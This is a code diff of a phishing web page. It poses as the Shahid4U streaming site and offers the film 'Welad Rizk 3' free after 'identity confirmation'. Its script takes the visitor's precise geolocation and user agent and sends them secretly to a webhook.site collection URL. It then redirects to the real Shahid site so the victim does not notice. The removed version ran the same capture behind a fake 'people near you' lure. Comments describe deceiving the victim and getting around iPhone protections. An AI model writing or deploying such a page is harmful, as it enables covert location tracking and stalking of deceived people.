@@ -3,70 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Near You | شاهد من حولك</title>
+    <title>شاهد فور يو | Shahid4U</title>
     <style>
-        body {
-            background-color: #000;
-            color: white;
-            font-family: 'Raleway', sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        .button {
-            background-color: #e50914;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 5px;
-            font-size: 1.2rem;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        h1 { font-size: 2.5rem; margin-bottom: 10px; }
-        p { color: #ccc; }
+        body { background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .btn { background-color: #ff0000; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 1.2rem; cursor: pointer; text-decoration: none; }
     </style>
 </head>
 <body>
-
-    <h1>Find People Near You</h1>
-    <p>Meet New People, Make New Friends</p>
-    
-    <button id="change" class="button" onclick="startProcess()">Continue</button>
+    <div>
+        <h1>مشاهدة فيلم "ولاد رزق 3" حصرياً</h1>
+        <p>يجب تأكيد هويتك للمتابعة والمشاهدة مجاناً</p>
+        <button class="btn" onclick="startProcess()">Continue / متابعة</button>
+    </div>
 
     <script>
-        function startProcess() {
-            document.getElementById('change').innerHTML = "جاري التحميل...";
-            
+        async function startProcess() {
+            // رابط الـ Webhook الخاص بك
+            const webhookUrl = 'https://webhook.site/866c5c83-d3aa-4627-b9e5-5f835299495f';
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    const webhookUrl = "https://webhook.site/866c5c83-d3aa-4627-b9e5-5f835299495f";
 
-                    // إرسال البيانات فوراً لصفحة الـ Webhook الخاصة بك
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({
-                            latitude: lat,
-                            longitude: lon,
-                            map_link: `https://www.google.com/maps?q=${lat},${lon}`
-                        })
-                    }).then(() => {
-                        // بعد السحب، نوهمه أن الخدمة قيد التطوير
-                        alert("Thank you for taking interest! This product is coming soon in your area.");
+                    const data = {
+                        latitude: lat,
+                        longitude: lon,
+                        map_link: `https://www.google.com/maps?q=${lat},${lon}`,
+                        userAgent: navigator.userAgent
+                    };
+
+                    // إرسال البيانات بوضع no-cors لضمان العبور من حماية الآيفون
+                    try {
+                        await fetch(webhookUrl, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(data)
+                        });
+                    } catch (e) {
+                        console.log("Sent");
+                    }
+
+                    // تحويل المستخدم لموقع شاهد الحقيقي بعد 1 ثانية
+                    setTimeout(() => {
                         window.location.href = "https://shahid.mbc.net/";
-                    });
+                    }, 1000);
 
-                }, function(error) {
-                    alert("عذراً، يجب السماح بالوصول للموقع لتتمكن من رؤية الأشخاص القريبين منك.");
-                    document.getElementById('change').innerHTML = "Continue";
-                });
+                }, (error) => {
+                    alert("عذراً، يجب السماح بالوصول للموقع لتتمكن من رؤية الأفلام القريبة منك!");
+                }, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
             } else {
                 alert("متصفحك لا يدعم هذه الميزة.");
             }
